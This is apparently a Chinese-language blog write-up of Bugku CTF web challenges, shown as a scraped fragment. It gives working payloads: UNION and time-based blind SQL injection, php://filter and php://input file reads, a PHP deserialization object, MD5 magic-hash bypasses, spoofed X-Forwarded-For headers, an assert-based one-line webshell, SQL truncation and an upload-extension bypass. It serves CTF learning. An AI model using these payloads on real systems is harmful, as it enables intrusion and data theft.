\u0026#39;%66%75%6e%63%74%69%6f%6e%20%63%68%65%63%6b%53%75%62%6d%69%74 %28%29%7b%76%61%72%20%61%3d%64%6f%63%75%6d%65%6e%74%2e%67%65%74%45%6c %65%6d%65%6e%74%42%79%49%64%28%22%70%61%73%73%77%6f%72%64%22%29% 3b%69%66%28%22%75%6e%64%65%66%69%6e%65%64%22%21%3d%74%79%70 %65%6f%66%20%61%29%7b%69%66%28%22%36%37%64%37%30%39%62%32%62\u0026#39; b = \u0026#39;%61%61%36%34%38%63%66%36%65%38%37%61%37%31%31%34%66%31%22%3d %3d%61%2e%76%61%6c%75%65%29%72%65%74%75%72%6e%21%30%3b%61%6c%65%72 %74%28%22%45%72%72%6f%72%22%29%3b%61%2e%66%6f%63%75%73%28%29%3b%72 %65%74%75%72%6e%21%31%7d%7d%64%6f%63%75%6d%65%6e%74%2e%67%65%74%45 %6c%65%6d%65%6e%74%42%79%49%64%28%22%6c%65%76%65%6c%51%75 %65%73%74%22%29%2e%6f%6e%73%75%62%6d%69%74%3d%63%68%65%63%6b%53%75%62%6d%69%74%3b\u0026#39; print urllib.unquote(a+b) 得到代码如下：\nfunction checkSubmit() { var a=document.getElementById(\u0026#34;password\u0026#34;); if(\u0026#34;undefined\u0026#34;!=typeof a) { if(\u0026#34;67d709b2b54aa2aa648cf6e87a7114f1\u0026#34;==a.value)return!0; alert(\u0026#34;Error\u0026#34;); a.focus(); return!1} } document.getElementById(\u0026#34;levelQuest\u0026#34;).onsubmit=checkSubmit; 可以看出这里已经暴露了password，返回输入即可。\nflag在index里面 点击链接，看url：file=show.Php，参数file是关键， 本地包含(include)：file=php：//filter/read=convert.base64-encode/resource=index.php,\n有关于这些协议的内容要好好看看\n输入密码得到flag 用burpsuite直接打\n点击一百万次 使用hackbar使用post动作：click = 1000001就得到了flag\n备份是个好习惯 知识点补充 $_SEVRER函数\n\u0026lt;?php $SERVER[\u0026#34;$QUERY_STRING\u0026#34;] //获取查询语句也就是？之后的内容 $SERBER[\u0026#34;REQUEST_URI\u0026#34;] //用来获取URL中的路径地址部分（不是url！）例如：http://www.hujuntao.com/index.php?p=3 //$_SERVER[\u0026#39;REQUEST_URI\u0026#39;]获得的就是/index.php?p=3这部分 $_SERVER[\u0026#34;HTTP_X_REWRITE_URL\u0026#34;] //在IIS下功能同上，在apache环境下显示为空 $SERVER[\u0026#34;SCRIPT_NAME\u0026#34;] //获取当前脚本的路径，比如“/aaa/index.php” $_SERVER[\u0026#34;PHP_SELF\u0026#34;] //正在执行的脚本名，比如“/aaa/index.php” str function\n\u0026lt;?php strstr($_SERVER[\u0026#39;REQUEST_URI\u0026#39;], \u0026#39;?\u0026#39;) //return the string after \u0026#39;?\u0026#39; (include \u0026#39;?\u0026#39;) substr($str,1) //return the string after the first symbol str_replace(\u0026#39;key\u0026#39;,\u0026#39;\u0026#39;,$str) //replace the \u0026#39;key\u0026#39; in str to \u0026#39;\u0026#39; parse_str($str) //parse the str for example: $str = \u0026#34;first=value\u0026amp;arr[]=foo+bar\u0026amp;arr[]=baz\u0026#34;; // 推荐用法 parse_str($str, $output); echo $output[\u0026#39;first\u0026#39;]; // value echo $output[\u0026#39;arr\u0026#39;][0]; // foo bar echo $output[\u0026#39;arr\u0026#39;][1]; // baz // 不建议这么用 parse_str($str); echo $first; // value echo $arr[0]; // foo bar echo $arr[1]; // baz 回到bugku题目：备份是个好习惯\n打开界面发现只有一串字符串 搜索index.php.bak可以看到源码：\n\u0026lt;?php /** * Created by PhpStorm. * User: Norse * Date: 2017/8/6 * Time: 20:22 */ include_once \u0026#34;flag.php\u0026#34;; ini_set(\u0026#34;display_errors\u0026#34;, 0); $str = strstr($_SERVER[\u0026#39;REQUEST_URI\u0026#39;], \u0026#39;?\u0026#39;);//get string before \u0026#34;?\u0026#34; $str = substr($str,1); //get string after the second symbol $str = str_replace(\u0026#39;key\u0026#39;,\u0026#39;\u0026#39;,$str); //replace \u0026#39;key\u0026#39; to \u0026#39;\u0026#39; in str parse_str($str); echo md5($key1); echo md5($key2); if(md5($key1) == md5($key2) \u0026amp;\u0026amp; $key1 !== $key2){ echo $flag.\u0026#34;取得flag\u0026#34;; } ?\u0026gt; 然后分析构造payload，这里有一个知识点，用MD5加密的过程中，如果两个字符经MD5加密后的值为 0exxxxx形式，就会被认为是科学计数法，且表示的是0*10的xxxx次方，还是零，都是相等的。\n下列的字符串的MD5值都是0e开头的数字：\nQNKCDZO\n240610708\ns878926199a\ns155964671a\ns214587387a\n比较md5(username),md5(password),md5(code)类型和值，双等于存在漏洞的原因其实是，0E开头的MD5值php解析器会解析为numerical strings，在双等于（==）情况下，会先判断类型，识别为numerical strings，会强制转换为数字，所以0e开头的MD5值都为0，所以才能绕过，然而三等于就比较有脾气了，必须一对一的核对两个字符串，不存在什么类型转换问题，所以开头0e相同，后面不同，也就不满足了\n所以构造payload：\nindex.php?kkey1=QNKCDZO\u0026amp;kkey2=240610708 按下回车就得到了flag\n另：有一个扫描查看源码泄露的脚本，使用指南和下载地址如下： https://coding.net/u/yihangwang/p/SourceLeakHacker/git?public=true\n成绩单 判断是数据库的问题，一开始犯蠢在url框里面写payload。。。。 根据昨天所学的知识，我们先输入1，可以输出成绩单。然后输入1’发现失败， 在尾部添加一个#又可以正常显示了。Emmmm。。。然后由于成绩单里面有三个列， 所以从3开始试试看看到底有几个列。。。。 最终在输入-1’ union select 1,2,3,4#的时候能够显示出内容，由此确定了有四列。\n这个地方有点迷：同样是post形式， 在查询框里面输入1’#就可以但是在hackbar里面写id=1‘#就不行， 然而用id=1也是可以正常显示的。。。这个地方很是让我困惑， 后来的payload也是在查询框里面写的。 第二个问题是，同样是注释，为啥#就可以起作用但是\u0026ndash;+就不行， 考虑到题目的类型（水题），感觉不太可能是过滤掉了。。。很迷。。。。\n已解决：\u0026ndash;+的‘+’的意思是url中的空格，真实的注释仅仅是\u0026ndash;\n做完这一切后就可以开始了： 首先是查到所有数据库的名字 -1’ union select 1,2,group_concat(schema_name),4 from information_schema.schemata# 得到了数据库名字有一个叫做skctf_flag的 接下来，通过数据库名字查找表名 -1’ union select 1,2,group_concat(table_name),4 from information_schema.tables where table_schema=’skctf_flag’#\t得到了一个叫做fl4g的一个表 接下来通过表明找列名 -1’ union select 1,2,group_concat(column_name),4 from information_schema.columns where table_name=’fl4g’# 得到了一个列名字叫做skctf_flag 最后通过列名找到内容 -1’union select 2,3,group_concat(skctf_flag),4 from skctf_flag.fl4g# 得到flag\ncookie欺骗 看到网址里面filename后面是base64编码的东西，尝试解码看到是keys.txt 改成index.php试一试，然后这里有一个line参数，随便输个1什么的，可以看到有php代码返回 （有一个困惑就是输入0不返回最开始的\u0026lt;?php）然后构造低端脚本：\nimport requests #http://123.206.87.240:8002/web11/index.php?line=\u0026amp;filename=aW5kZXgucGhw url1 = \u0026#39;http://123.206.87.240:8002/web11/index.php?line=\u0026#39; url2 = \u0026#39;\u0026amp;filename=aW5kZXgucGhw\u0026#39; for para in range(0,20): url = url1 + repr(para) + url2 print(requests.get(url).content) 得到了以下代码\n\u0026lt;?php error_reporting(0); $file=base64_decode(isset($_GET[\u0026#39;filename\u0026#39;])?$_GET[\u0026#39;filename\u0026#39;]:\u0026#34;\u0026#34;); $line=isset($_GET[\u0026#39;line\u0026#39;])?intval($_GET[\u0026#39;line\u0026#39;]):0;//这里应该是base进制转换，line为空的话默认设置为0 if($file==\u0026#39;\u0026#39;) header(\u0026#34;location:index.php?line=\u0026amp;filename=a2V5cy50eHQ=\u0026#34;); $file_list = array( \u0026#39;0\u0026#39; =\u0026gt;\u0026#39;keys.txt\u0026#39;, \u0026#39;1\u0026#39; =\u0026gt;\u0026#39;index.php\u0026#39;, ); if(isset($_COOKIE[\u0026#39;margin\u0026#39;]) \u0026amp;\u0026amp; $_COOKIE[\u0026#39;margin\u0026#39;]==\u0026#39;margin\u0026#39;){ $file_list[2]=\u0026#39;keys.php\u0026#39;; } if(in_array($file, $file_list)){ $fa = file($file);//应该是打开文件的意思，文件应该是在同级目录下 echo $fa[$line]; } ?\u0026gt; 然后这是别人的获取代码脚本：\n#!/usr/bin/env python # -*- coding: utf-8 -*- import requests s=requests.Session() url=\u0026#39;http://120.24.86.145:8002/web11/index.php\u0026#39; for i in range(1,20): payload={\u0026#39;line\u0026#39;:str(i),\u0026#39;filename\u0026#39;:\u0026#39;aW5kZXgucGhw\u0026#39;} a=s.get(url,params=payload).content content=str(a,encoding=\u0026#34;utf-8\u0026#34;) print(content) 嗯人家的正规很多啊\n然后这里就是要post一个cookie，其中的参数是margin=margin,而且要把filename设置为 keys.php的base64编码形式。这个就在burpsuite中操作：\nbugku\u0026ndash;insert into the injection point is as follows:\n$sql=\u0026ldquo;insert into client_ip (ip) values (\u0026rsquo;$ip\u0026rsquo;)\u0026rdquo;;\nthe $ip comes from \u0026ldquo;x-forwarded-for\u0026rdquo;\nand before this code, the symbol \u0026lsquo;,\u0026rsquo; has been filtered in our input;\npayload are as followed:\n127.0.0.1+(select case when substr((select flag from flag) from 1 for 1)=\u0026#39;C\u0026#39; then sleep(5) else 0 end)-- + the \u0026lsquo;+\u0026rsquo; on the tail is not for annotation,instead it exists for the blank space before ,because the posted data\u0026rsquo;s last space will be ignored ,but adding another symbol after the space can avoid it.\nnever give up 查看源代码，看见注释\n修改url，进入的是ctf的主页，在viewsource中修改代码，得到了另一个网页的源代码，查找得到 可能是重定向。\n\u0026lt;HTML\u0026gt; \u0026lt;HEAD\u0026gt; \u0026lt;SCRIPT LANGUAGE=\u0026#34;Javascript\u0026#34;\u0026gt; \u0026lt;!-- var Words =\u0026#34;%3Cscript%3Ewindow.location.href%3D%27http%3A//www.bugku.com%27%3B%3C/script%3E%20%0A %3C%21--JTIyJTNCaWYlMjglMjElMjRfR0VUJTVCJTI 3aWQlMjclNUQlMjklMEElN0IlMEElMDloZWFkZXIlMjglMjdMb2NhdGlvbiUzQSUyMGhlbGxvLnBocCU zRmlkJTNEMSUyNyUyOSUzQiUwQSUwOWV4aXQlMjglMjklM0IlMEElN0QlMEElMjRpZCUzRCUyNF9HRVQ lNUIlMjdpZCUyNyU1RCUzQiUwQSUyNGElM0QlMjRfR0VUJTVCJTI3YSUyNyU1RCUzQiUwQSUyNGIlM0Q lMjRfR0VUJTVCJTI3YiUyNyU1RCUzQiUwQWlmJTI4c3RyaXBvcyUyOCUyNGElMkMlMjcuJTI3JTI5JTI 5JTBBJTdCJTBBJTA5ZWNobyUyMCUyN25vJTIwbm8lMjBubyUyMG5vJTIwbm8lMjBubyUyMG5vJTI3JTN CJTBBJTA5cmV0dXJuJTIwJTNCJTBBJTdEJTBBJTI0ZGF0YSUyMCUzRCUyMEBmaWxlX2dldF9jb250ZW5 0cyUyOCUyNGElMkMlMjdyJTI3JTI5JTNCJTBBaWYlMjglMjRkYXRhJTNEJTNEJTIyYnVna3UlMjBpcyU yMGElMjBuaWNlJTIwcGxhdGVmb3JtJTIxJTIyJTIwYW5kJTIwJTI0aWQlM0QlM0QwJTIwYW5kJTIwc3R ybGVuJTI4JTI0YiUyOSUzRTUlMjBhbmQlMjBlcmVnaSUyOCUyMjExMSUyMi5zdWJzdHIlMjglMjRiJTJ DMCUyQzElMjklMkMlMjIxMTE0JTIyJTI5JTIwYW5kJTIwc3Vic3RyJTI4JTI0YiUyQzAlMkMxJTI5JTI xJTNENCUyOSUwQSU3QiUwQSUwOXJlcXVpcmUlMjglMjJmNGwyYTNnLnR4dCUyMiUyOSUzQiUwQSU3RCU wQWVsc2UlMEElN0IlMEElMDlwcmludCUyMCUyMm5ldmVyJTIwbmV2ZXIlMjBuZXZlciUyMGdpdmUlMjB 1cCUyMCUyMSUyMSUyMSUyMiUzQiUwQSU3RCUwQSUwQSUwQSUzRiUzRQ%3D%3D--%3E\u0026#34; function OutWord() { var NewWords; NewWords = unescape(Words);//unescape()函数可对通过 escape()编码的字符串进行解码。 //该函数的工作原理是这样的：通过找到形式为 %xx 和 %uxxxx 的字符序列（x 表示十六进制的数字）， //用 Unicode 字符 \\u00xx 和 \\uxxxx 替换这样的字符序列进行解码。 document.write(NewWords); //把东西直接写道html页面里面 } OutWord(); // --\u0026gt; \u0026lt;/SCRIPT\u0026gt; \u0026lt;/HEAD\u0026gt; \u0026lt;BODY\u0026gt; \u0026lt;/BODY\u0026gt; \u0026lt;/HTML\u0026gt; 那个一大串的东西是url编码的东西（观察到开头和结尾部分可能是一对注释的头尾）。 在python中解码如下：\nimport urllib a=\u0026#34;%3C%21--JTIyJTNCaWYlMjglMjElMjRfR0VUJTVCJTI 3aWQlMjclNUQlMjklMEElN0IlMEElMDloZWFkZXIlMjglMjdMb2NhdGlvbiUzQSUyMGhlbGxvLnBocCU zRmlkJTNEMSUyNyUyOSUzQiUwQSUwOWV4aXQlMjglMjklM0IlMEElN0QlMEElMjRpZCUzRCUyNF9HRVQ lNUIlMjdpZCUyNyU1RCUzQiUwQSUyNGElM0QlMjRfR0VUJTVCJTI3YSUyNyU1RCUzQiUwQSUyNGIlM0Q lMjRfR0VUJTVCJTI3YiUyNyU1RCUzQiUwQWlmJTI4c3RyaXBvcyUyOCUyNGElMkMlMjcuJTI3JTI5JTI 5JTBBJTdCJTBBJTA5ZWNobyUyMCUyN25vJTIwbm8lMjBubyUyMG5vJTIwbm8lMjBubyUyMG5vJTI3JTN CJTBBJTA5cmV0dXJuJTIwJTNCJTBBJTdEJTBBJTI0ZGF0YSUyMCUzRCUyMEBmaWxlX2dldF9jb250ZW5 0cyUyOCUyNGElMkMlMjdyJTI3JTI5JTNCJTBBaWYlMjglMjRkYXRhJTNEJTNEJTIyYnVna3UlMjBpcyU yMGElMjBuaWNlJTIwcGxhdGVmb3JtJTIxJTIyJTIwYW5kJTIwJTI0aWQlM0QlM0QwJTIwYW5kJTIwc3R ybGVuJTI4JTI0YiUyOSUzRTUlMjBhbmQlMjBlcmVnaSUyOCUyMjExMSUyMi5zdWJzdHIlMjglMjRiJTJ DMCUyQzElMjklMkMlMjIxMTE0JTIyJTI5JTIwYW5kJTIwc3Vic3RyJTI4JTI0YiUyQzAlMkMxJTI5JTI xJTNENCUyOSUwQSU3QiUwQSUwOXJlcXVpcmUlMjglMjJmNGwyYTNnLnR4dCUyMiUyOSUzQiUwQSU3RCU wQWVsc2UlMEElN0IlMEElMDlwcmludCUyMCUyMm5ldmVyJTIwbmV2ZXIlMjBuZXZlciUyMGdpdmUlMjB 1cCUyMCUyMSUyMSUyMSUyMiUzQiUwQSU3RCUwQSUwQSUwQSUzRiUzRQ%3D%3D--%3E\u0026#34; print urllib.unquote(a) 这里面出来的是base64编码的东西，解码得到\n\u0026#34;;if(!$_GET[\u0026#39;id\u0026#39;]) header(\u0026#39;Location: hello.php?id=1\u0026#39;); exit(); } $id=$_GET[\u0026#39;id\u0026#39;]; $a=$_GET[\u0026#39;a\u0026#39;]; $b=$_GET[\u0026#39;b\u0026#39;]; if(stripos($a,\u0026#39;.\u0026#39;)) echo \u0026#39;no no no no no no no\u0026#39;; return ; } $data = @file_get_contents($a,\u0026#39;r\u0026#39;);//file_get_contents - 将整个文件读入字符串 if($data==\u0026#34;bugku is a nice plateform!\u0026#34; and $id==0 and strlen($b)\u0026gt;5 and eregi(\u0026#34;111\u0026#34;.substr($b,0,1),\u0026#34;1114\u0026#34;) and substr($b,0,1)!=4) //eregi是正则匹配函数 require(\u0026#34;f4l2a3g.txt\u0026#34;); } else print \u0026#34;never never never give up !!!\u0026#34;; } ?\u0026gt; 其实直接在url里面写一个f4l2a3g.txt就可以得到flag了\n正解如下： 题目的意思是要满足以下条件：\nid不等于0\nid弱等于0，那么查看php的表格发现字符串弱等于0，所以让id=“ijk”\nb的第一个字符不等于4，又要让“111”.substr(b,0,1)和“1114”匹配起来。eregi函数可以用截断字符\\x00绕过 但是注意在输入url的时候\\x00会被转码，导致url被截断。注意，虽然 b=%0012345 实际字符串长度为 8 字节， 但在后台脚本读入数据时，会将 URL 编码 %00 转换成 1 字节。所以说，空字符应该在后台脚本的变量中出现， 而不是在 URL 查询字符串变量中出现。\n$data 是由 file_get_contents() 函数读取变量 $a 的值而得，所以 $a 的值必须为数据流。 在服务器中自定义一个内容为 bugku is a nice plateform! 文件，再把此文件路径赋值给 $a，显然不太现实。 伪协议 php:// 来访问输入输出的数据流，其中 php://input 可以访问原始请求数据中的只读流。\n所以构造如下：\nid=\u0026quot;int\u0026quot;\u0026amp;b=%0012345\u0026amp;a=php://input 并在burp的请求头中添加bugku is a nice plateform! welcome to the bugkuctf 进入源代码界面，file_get_contents说明得是数据流，看到hint.php,然后再检索框里面输入：\nindex.php?txt=php://input\u0026amp;file=hint.php 并且在burpsuite中添加welcome to thebugkuctf 得到的只是hint.php的效果界面，要看到hint的源码，要这样输入\nindex.php?txt=php://input\u0026amp;file=php://filter/read=convert.base64-encode/resource=hint.php 输出一堆base64编码，解码得到\n\u0026lt;?php class Flag{//flag.php public $file; public function __tostring(){ if(isset($this-\u0026gt;file)){ echo file_get_contents($this-\u0026gt;file); echo \u0026#34;\u0026lt;br\u0026gt;\u0026#34;; return (\u0026#34;good\u0026#34;); } } } ?\u0026gt; 同样的道理，使用 index.php?txt=php://input\u0026amp;file=php://filter/read=convert.base64-encode/resource=index.php\n解码得到了index.php的源代码。\n\u0026lt;?php $txt = $_GET[\u0026#34;txt\u0026#34;]; $file = $_GET[\u0026#34;file\u0026#34;]; $password = $_GET[\u0026#34;password\u0026#34;]; if(isset($txt)\u0026amp;\u0026amp;(file_get_contents($txt,\u0026#39;r\u0026#39;)===\u0026#34;welcome to the bugkuctf\u0026#34;)){ echo \u0026#34;hello friend!\u0026lt;br\u0026gt;\u0026#34;; if(preg_match(\u0026#34;/flag/\u0026#34;,$file)){ echo \u0026#34;不能现在就给你flag哦\u0026#34;; exit(); }else{ include($file); $password = unserialize($password); echo $password; } }else{ echo \u0026#34;you are not the number of bugku ! \u0026#34;; } ?\u0026gt; \u0026lt;!-- $user = $_GET[\u0026#34;txt\u0026#34;]; $file = $_GET[\u0026#34;file\u0026#34;]; $pass = $_GET[\u0026#34;password\u0026#34;]; if(isset($user)\u0026amp;\u0026amp;(file_get_contents($user,\u0026#39;r\u0026#39;)===\u0026#34;welcome to the bugkuctf\u0026#34;)){ echo \u0026#34;hello admin!\u0026lt;br\u0026gt;\u0026#34;; include($file); //hint.php }else{ echo \u0026#34;you are not admin ! \u0026#34;; } --\u0026gt; 显然这里不让我们再file中输入flag文件名。但是Flag类在构造对象的时候会执行构造函数，这个时候 有机会echo出我们要的文件。但是要怎么利用password来传入我们要的对象呢？看到了unseialize反序列函数 这个函数可以把对象从序列化的字符串还原出对象来.在PHP中,序列化用于存储或传递PHP 的值的过程中,同时不丢失其类型和结构\n所以我们编写如下代码：\n\u0026lt;?php Class Flag{ public $file=\u0026#39;flag.php\u0026#39; } $a = new Flag; echo serialize($a); ?\u0026gt; 输出O:4:\u0026ldquo;Flag\u0026rdquo;:1:{s:4:\u0026ldquo;file\u0026rdquo;;s:8:\u0026ldquo;flag.php\u0026rdquo;;}\n于是传入参数index.php?txt=welcome to the bugkuctf\u0026amp;file=hint.php\u0026amp;password=O:4:\u0026ldquo;Flag\u0026rdquo;:1:{s:4:\u0026ldquo;file\u0026rdquo;;s:8:\u0026ldquo;flag.php\u0026rdquo;;}\n得到flag\n过狗一句话 刚开始给我们的php代码：\n\u0026lt;?php $poc=\u0026#34;a#s#s#e#r#t\u0026#34;; $poc_1=explode(\u0026#34;#\u0026#34;,$poc); $poc_2=$poc_1[0].$poc_1[1].$poc_1[2].$poc_1[3].$poc_1[4].$poc_1[5]; $poc_2($_GET[\u0026#39;s\u0026#39;]) ?\u0026gt; 看意思explode就是根据第一参数的规则将目标划分为一个数组。那么pro2就是assert的意思 assert（）一个东西，如果字符串会被当做代码执行，否则是false\n以下解法 试探一下：?index.php?s=phpinfo();//可以正常执行 ?index.php?s=print_r(scandir(./)) //./的意思应该是在当前目录下，scan扫描目录文件返回一个数组\n显示了flag所处的txt文件夹，之后用var_dump()或者show_source()或者直接访问都可以 字符？正则？ 打开网页，要求匹配的正则式子如下：\n/key.*key.{4,7}key:\\/.\\/(.*key)[a-z][[:punct:]]/i /。。。。/这对东西标志正则表达式的开头和结尾，类似的还有#。。。#等\n[[:punct:]] ：匹配任何标点符号；\n/i ：表示这个正则表达式对大小写不敏感； 一开始我写的匹配对象是这样的：\nhttp://123.206.87.240:8002/web10/?id=keykey00000key://keyb. 但是失败原因是在最后两个斜杠上，他们在url输入的时候前一个会充当转义作用，实际输入的只有一个/ 变成这样就好了：\nhttp://123.206.87.240:8002/web10/?id=keykey00000key:///keyb. 前女友 打开源代码，发现在链接处有个链接，点进入是php代码\n\u0026lt;?php if(isset($_GET[\u0026#39;v1\u0026#39;]) \u0026amp;\u0026amp; isset($_GET[\u0026#39;v2\u0026#39;]) \u0026amp;\u0026amp; isset($_GET[\u0026#39;v3\u0026#39;])){ $v1 = $_GET[\u0026#39;v1\u0026#39;]; $v2 = $_GET[\u0026#39;v2\u0026#39;]; $v3 = $_GET[\u0026#39;v3\u0026#39;]; if($v1 != $v2 \u0026amp;\u0026amp; md5($v1) == md5($v2)){ if(!strcmp($v3, $flag)){ echo $flag; } } } ?\u0026gt; 对于这里的md5，既可以采用md5碰撞的方法，也可以让两个变量都在输入的时候声明为数组得到false=false ，对于这里的strcmp可以试试把v3声明为一个不符合数据类型的东西比如说整数，这样可以让函数返回0(仅对php5.3之前版本有效)\nhttp://123.206.31.85:49162/index.php?v1=s878926199a\u0026amp;v2=s155964671a\u0026amp;v3[]=1 或者 http://123.206.31.85:49162/index.php?v1[]=1\u0026amp;v2[]=2\u0026amp;v3[]=1 login1 打开之后是登陆界面，提示说是sql约束攻击，具体博客教程看这里sql约束攻击\n总而言之为了创建一个新的admin，我们注册以下账户：\nusername：admin 1 password：2017zxwlB 注册的时候，会首先查看是否有相同的用户名，但是因为select查询语句并不对超出最大长度限 制的检索对象进行尾部修剪，所以在这种情况下，我们注册的用户名在数据库中并不存在。\n既然不存在，就会向表中插入这条新的用户数据，但是由于超出了varchar()所规定的长度，所以 超出部分会被截断，这是第一重处理，接下来数据库会把有效字符后面的空格都删掉，这是第二重处理 由此我们插入了一个admin用户，使用的是自己的密码就可以登陆\n登陆就好了。\n你从哪里来 题目说 你是从谷歌来的吗？，在burpsuite中添加referer:https://www.google.com就可以了\nmd5 collision 从历史write up中记录的转化后的值为0的md5码中选两个出来作为参数就可以了\n程序员本地网站 要求从本地访问，在burpsuite中添加一条x-forwarded-for:127.0.0.1就可以了！\n各种绕过 打开网页之后看到的代码如下\n\u0026lt;?php highlight_file(\u0026#39;flag.php\u0026#39;); $_GET[\u0026#39;id\u0026#39;] = urldecode($_GET[\u0026#39;id\u0026#39;]); $flag = \u0026#39;flag{xxxxxxxxxxxxxxxxxx}\u0026#39;; if (isset($_GET[\u0026#39;uname\u0026#39;]) and isset($_POST[\u0026#39;passwd\u0026#39;])) { if ($_GET[\u0026#39;uname\u0026#39;] == $_POST[\u0026#39;passwd\u0026#39;]) print \u0026#39;passwd can not be uname.\u0026#39;; else if (sha1($_GET[\u0026#39;uname\u0026#39;]) === sha1($_POST[\u0026#39;passwd\u0026#39;])\u0026amp;($_GET[\u0026#39;id\u0026#39;]==\u0026#39;margin\u0026#39;)) die(\u0026#39;Flag: \u0026#39;.$flag); else print \u0026#39;sorry!\u0026#39;; } ?\u0026gt; sha1是散列算法函数，返回散列值。这里传入两个不符合数据类型的数据来让两个都返回false就可以做到相等 ，那么就让uname声明成为一个数组，并且用hackbar传一个数组类型的passwd进去。id=margin就行了。\nweb8 打开网站显示代码\n\u0026lt;?php extract($_GET);//解析所有通过get方式获取的变量 if (!empty($ac)) { $f = trim(file_get_contents($fn));//从打开fn所代表的文件，或者是文件流 if ($ac === $f)//强等于 { echo \u0026#34;\u0026lt;p\u0026gt;This is flag:\u0026#34; .\u0026#34; $flag\u0026lt;/p\u0026gt;\u0026#34;; } else { echo \u0026#34;\u0026lt;p\u0026gt;sorry!\u0026lt;/p\u0026gt;\u0026#34;; } } ?\u0026gt; 可知有两种解法：\n解法一：利用php://input传入fn一个值并让他和ac相等(这里很奇怪我的hackbar不能给php://input传数据，但是burpsuite应该可以)\n解法二：根据题目提示，猜测有flag.txt在同级目录下，访问之看到文件内容显示flags， 那么让ac=flags，fn=flag.txt就可以得到flag了。\n细心 使用御剑软件扫描网站，发现有robots.txt,点进去显示\nUser-agent: * Disallow: /resusl.php 访问这个php文件试试，看到了显示里头警告不是管理员登陆，自己的ip已经被记录，第一反应是伪造本地访问\nHost: 127.0.0.1 Referer: 127.0.0.1 X-Forwarded-For: 127.0.0.1 Client-IP: 127.0.0.1 X-Remote-IP: 127.0.0.1 X-Originating-IP: 127.0.0.1 X-Remote-Addr: 127.0.0.1 这几种方式都可以在burpsuite中进行修改来伪造本地访问。(但是题目的考点似乎并不在此)\n接下来显示\nBy bugkuctf. if ($_GET[x]==$password) 此处省略1w字 试一试把x赋值成admin试一试？刚开始题目的文字信息就让我们试试构造了admin，果然有了flag\nrobots.txt是一个纯文本文件，在这个文件中网站管理者可以声明该网站中不想被搜索引擎访 问的部分，或者指定搜索引擎只收录指定的内容。 当一个搜索引擎（又称搜索机器人或蜘蛛程序）访问一个站点时器人就会按照该文件中的内容来 确定访问的范围；如果该文件不存在，那么搜索机器人就沿着链接抓取。 求getshell（文件上传类型） 打开页面，要求发送图片文件而不是php文件。看网上说是黑名单过滤和类型检测，但是可以把 content-type 进行大小写绕过和类型修改，并且修改php文件的后缀名，可以修改成以下几种\nphp2, php3, php4, php5, phps, pht, phtm, phtml 试了以上几种之后，php5可以拿到flag。\n","permalink":"https://ch3n9w.github.io/posts/ctf-bugku-writeup/","summary":"\u003cblockquote\u003e\n\u003cp\u003e纪念那段岁月\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003ch2 id=\"web3\"\u003eweb3\u003c/h2\u003e\n\u003cp\u003e网站里面循环弹出提示框，用chrome的开发者工具打开一片空白，\n用ctrl+u查看源代码，发现一串\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003e  \u0026lt;!--\u0026amp;#75;\u0026amp;#69;\u0026amp;#89;\u0026amp;#123;\u0026amp;#74;\u0026amp;#50;\u0026amp;#115;\n  \u0026amp;#97;\u0026amp;#52;\u0026amp;#50;\u0026amp;#97;\u0026amp;#104;\u0026amp;#74;\u0026amp;#75;\u0026amp;#45;\n  \u0026amp;#72;\u0026amp;#83;\u0026amp;#49;\u0026amp;#49;\u0026amp;#73;\u0026amp;#73;\u0026amp;#73;\u0026amp;#125;--\u0026gt;\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e这是unicode，转码即可\u003c/p\u003e\n\u003ch2 id=\"你必须让他停下来\"\u003e你必须让他停下来！\u003c/h2\u003e\n\u003cp\u003e查看源代码竟然直接有flag了，网上的解法是抓包\u003c/p\u003e\n\u003ch2 id=\"本地包含\"\u003e本地包含\u003c/h2\u003e\n\u003cp\u003e解法:利用hellow构造payload\n$_REQUEST：默认情况下包含了 $_GET，$_POST 和 $_COOKIE 的数组。\nvar_dump():此函数显示有关包含其类型和值的一个或多个表达式的结构化信息。\n递归地探索数组和对象，其中值缩进以显示结构。在这题里面只是显示变量的类型，对\neval并无影响，对于eval来说，和eval（$a）是一样的。\u003c/p\u003e\n\u003cp\u003epayload：/index.php?hello = show_source(\u0026lsquo;flag.php\u0026rsquo;)\n网上的payload：/index.php?hello=1);show_source(\u0026lsquo;flag.php\u0026rsquo;);var_dump(\u003c/p\u003e\n\u003ch2 id=\"域名解析\"\u003e域名解析\u003c/h2\u003e\n\u003cp\u003e编辑etc/hosts添加一条123.206.87.240\t flag.bugku.com，\n在浏览器中打开flag.bugku.com即可得到flag。\u003c/p\u003e\n\u003cp\u003e反思：host请求头是http1.1添加的东西，\n添加域名解析之后直接访问123.206.87.240却显示403，也就是说在https下主机名必不可少。\u003c/p\u003e\n\u003cp\u003e添加host之前访问ip地址结果显示错误400（缺少host）\n添加host之后访问ip地址结果显示错误403（读取访问被禁）\u003c/p\u003e\n\u003ch2 id=\"你必须让他停下\"\u003e你必须让他停下\u003c/h2\u003e\n\u003cp\u003e使用burpsuite的repeater功能进行抓包操作，\n通过多次点击go，最终发现在原先是“flag is here”的位置出现了flag\u003c/p\u003e\n\u003ch2 id=\"变量1\"\u003e变量1\u003c/h2\u003e\n\u003cp\u003e函数知识：\nisset（）判断是否有输入\npre_match是正则表达式，引号中的内容都以/^开头，以$/结尾，\\w+的意思是0\u003cdel\u003e9 a\u003c/del\u003ez A~Z，\n输入的内容被限定了，所以不能输入代码\u003c/p\u003e\n\u003cp\u003e输入arg=GLOBALS，从代码中可知会给GLOBALS再套上一个$，就输出了flag\u003c/p\u003e\n\u003ch2 id=\"web5\"\u003eWeb5\u003c/h2\u003e\n\u003cp\u003e查看源代码，发现jother编码，打开控制台输入就行了\u003c/p\u003e\n\u003ch2 id=\"头等舱\"\u003e头等舱\u003c/h2\u003e\n\u003cp\u003e打开网页显示什么都没有，查看源代码也什么都没有，打开控制台重新加载看头文件，什么也没有，\n点击显示头文件源代码，显示flag（注释形式）\u003c/p\u003e\n\u003ch2 id=\"网站被黑\"\u003e网站被黑\u003c/h2\u003e\n\u003cp\u003e扫描端口\u003c/p\u003e\n\u003cp\u003e发现登陆界面\u003c/p\u003e\n\u003cp\u003e然后用burpsuite的intruder功能破解\u003c/p\u003e\n\u003ch2 id=\"管理员系统\"\u003e管理员系统\u003c/h2\u003e\n\u003cp\u003e实在没有头绪，上网查说这是X-Forwarded-For:简称XFF头，它代表客户端，\n也就是HTTP的请求端真实的IP，只有在通过了HTTP 